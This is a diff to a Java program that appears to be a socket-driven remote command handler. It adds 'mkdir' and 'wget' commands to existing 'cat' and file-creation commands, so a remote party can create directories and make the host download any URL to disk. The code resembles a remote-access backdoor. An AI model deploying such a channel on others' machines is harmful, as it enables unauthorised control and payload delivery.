@@ -1,6 +1,8 @@
 import java.io.*;
+import java.net.HttpURLConnection;
 import java.net.InetAddress;
 import java.net.Socket;
+import java.net.URL;
 import java.util.Collection;
 import java.util.Map;
 import java.util.Properties;
@@ -77,6 +79,50 @@ public class Main {
                     printWriter.println("FAIL TO CREATE FILE: "+file.getName());
                     printWriter.flush();
                     continue;
+                }
+                if (message.startsWith("mkdir ")) {
+                    String path = message.substring(6);
+                    File file = new File(path);
+
+                    if (file.mkdir()) {
+                        printWriter.println("CREATE DIR: "+file.getName()+" OK");
+                        printWriter.flush();
+                        continue;
+                    }
+                    printWriter.println("FAIL TO CREATE DIR: "+file.getName());
+                    printWriter.flush();
+                    continue;
+                }
+                if (message.startsWith("wget ")) {
+                    try {
+                        String name = message.substring(5);
+                        URL url = new URL(name);
+                        String save = name.substring(name.lastIndexOf('/')+1);
+
+                        HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
+                        httpURLConnection.setRequestMethod("GET");
+                        httpURLConnection.connect();
+
+                        InputStream in = httpURLConnection.getInputStream();
+                        FileOutputStream fileOutputStream = new FileOutputStream(save);
+                        int length = -1;
+                        byte[] bytes = new byte[1024];
+                        while ((length = in.read(bytes)) != -1) {
+                            fileOutputStream.write(bytes,0,length);
+                            fileOutputStream.flush();
+                        }
+                        fileOutputStream.close();
+                        in.close();
+                        httpURLConnection.disconnect();
+                        printWriter.println("DOWNLOAD FILE: "+save+" OK");
+                        printWriter.flush();
+                        continue;
+
+                    }catch (Exception exception){
+                        printWriter.println("FAIL TO DOWNLOAD FILE: "+exception.getMessage());
+                        printWriter.flush();
+                        continue;
+                    }
                 }
                 if (message.startsWith("cat ")) {
                     String cat_path = message.substring(4);
